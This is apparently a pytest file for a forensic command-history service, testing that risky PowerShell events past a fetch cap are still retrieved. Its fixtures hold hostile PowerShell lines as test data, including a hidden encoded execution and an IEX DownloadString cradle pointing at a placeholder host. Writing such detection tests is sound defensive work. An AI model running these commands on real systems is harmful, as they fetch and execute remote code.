"""When the capped candidate fetch is truncated and only risky commands are
wanted, every candidate is scored on a light projection so risky commands
outside the cap (another host, another time) are still fetched."""

from __future__ import annotations

from app.services import command_history


def _hit(doc_id: str, text: str, ts: str, **extra) -> dict:
    return {"_id": doc_id, "_source": {"id": doc_id, "@timestamp": ts, "search_text": text, **extra}, "sort": [ts, doc_id]}


def test_risky_candidates_beyond_the_cap_are_fetched(monkeypatch) -> None:
    calls: list[dict] = []

    def fake_search(index, body):
        calls.append(body)
        if "ids" in body.get("query", {}):
            return {"hits": {"hits": [{"_id": i, "_source": {"id": i, "@timestamp": "2024-03-22T12:34:36Z"}} for i in body["query"]["ids"]["values"]]}}
        if body.get("_source") == command_history._RISK_SCAN_FIELDS:
            return {"hits": {"hits": [
                _hit("cap-1", "notepad.exe report.txt", "2024-03-22T10:00:00Z"),
                _hit("late-risky", "powershell -ep bypass -w hidden -enc AAAA", "2024-03-22T12:34:36Z"),
                _hit("late-benign", "calc.exe", "2024-03-22T12:35:00Z"),
                _hit("sb-1", "$s = 'powershell -nop -w hidden -ep bypass'", "2024-03-22T12:36:00Z", windows={"event_data": {"ScriptBlockId": "b1"}}),
                _hit("sb-2", "IEX (New-Object Net.WebClient).DownloadString('http://x')", "2024-03-22T12:36:01Z", windows={"event_data": {"ScriptBlockId": "b1"}}),
            ]}}
        is_dated = any("exists" in clause and clause["exists"].get("field") == "@timestamp" for clause in body["query"]["bool"]["filter"])
        if is_dated:
            return {"hits": {"total": {"value": 9000}, "hits": [{"_id": "cap-1", "_source": {"id": "cap-1", "@timestamp": "2024-03-22T10:00:00Z"}}]}}
        return {"hits": {"total": {"value": 0}, "hits": []}}

    monkeypatch.setattr(command_history, "search_documents", fake_search)

    events, truncated = command_history._fetch_candidate_events("case-1", {"only_suspicious": True})
    ids = {event["id"] for event in events}
    assert {"cap-1", "late-risky", "sb-1", "sb-2"} <= ids  # both parts of the risky script block
    assert "late-benign" not in ids
    assert truncated is False  # the risky set is complete; nothing risky was cut
    assert all(body.get("_source", {}) == command_history._RISK_SCAN_FIELDS or "excludes" in body.get("_source", {}) for body in calls)

    calls.clear()
    events, truncated = command_history._fetch_candidate_events("case-1", {})
    assert truncated is True and {event["id"] for event in events} == {"cap-1"}  # no risk filter: cap and warning as before


def test_powershell_log_script_is_not_the_process() -> None:
    windows = {"channel": "Microsoft-Windows-PowerShell/Operational"}
    process = command_history._script_host_process({"name": "baklavasom.ps1", "pid": 9248}, windows, "powershell_operational")
    assert process["name"] == "powershell.exe" and process["script_path"] == "baklavasom.ps1" and process["pid"] == 9248
    core = command_history._script_host_process({"path": "/opt/x/run.ps1"}, {"channel": "PowerShellCore/Operational"}, "powershell_operational")
    assert core["name"] == "pwsh.exe"
    # Real executables and other sources are left alone.
    assert command_history._script_host_process({"name": "powershell.exe"}, windows, "powershell_operational")["name"] == "powershell.exe"
    assert command_history._script_host_process({"name": "run.sh"}, {}, "linux_shell_history")["name"] == "run.sh"
